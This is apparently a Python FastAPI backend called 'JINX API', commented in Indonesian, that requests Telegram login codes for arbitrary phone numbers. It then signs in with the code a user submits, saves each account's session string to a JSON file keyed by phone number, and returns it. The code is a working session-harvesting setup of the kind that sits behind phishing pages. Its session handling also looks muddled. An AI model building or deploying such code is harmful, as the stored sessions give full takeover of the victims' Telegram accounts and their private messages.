# main.py — FASTAPI ASYNC (100% JALAN DI VERCEL!)
from fastapi import FastAPI, Form
from fastapi.responses import JSONResponse
from telethon import TelegramClient
from telethon.sessions import StringSession
import os
import json

app = FastAPI()

# BACA DARI session.txt (AMAN!)
def get_session():
    if os.path.exists('session.txt'):
        with open('session.txt', 'r') as f:
            content = f.read().strip()
            for line in content.split('\n'):
                if line.startswith('SESSION_STRING='):
                    return line.split('=', 1)[1]
    return None

API_ID = int(os.getenv('API_ID', '0'))
API_HASH = os.getenv('API_HASH', '')
SESSION_STRING = get_session()

if not SESSION_STRING or not API_ID or not API_HASH:
    @app.get("/")
    async def error():
        return {"error": "ENV / session.txt RUSAK!"}

DATA_FILE = 'data.json'

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

@app.get("/")
async def home():
    return {"message": "JINX API JALAN!", "status": "ready"}

@app.post("/send_code")
async def send_code(phone: str = Form(...)):
    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return JSONResponse({"success": False, "error": "session invalid"}, status_code=500)
        
        res = await client.send_code_request(phone)
        await client.disconnect()
        return {"success": True, "hash": res.phone_code_hash}
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)

@app.post("/login")
async def login(phone: str = Form(...), code: str = Form(...), hash: str = Form(...)):
    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(phone, code=code, phone_code_hash=hash)
        sess = client.session.save()
        data = load()
        data[phone] = {"session": sess}
        save(data)
        await client.disconnect()
        return {"success": True, "session": sess}
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)
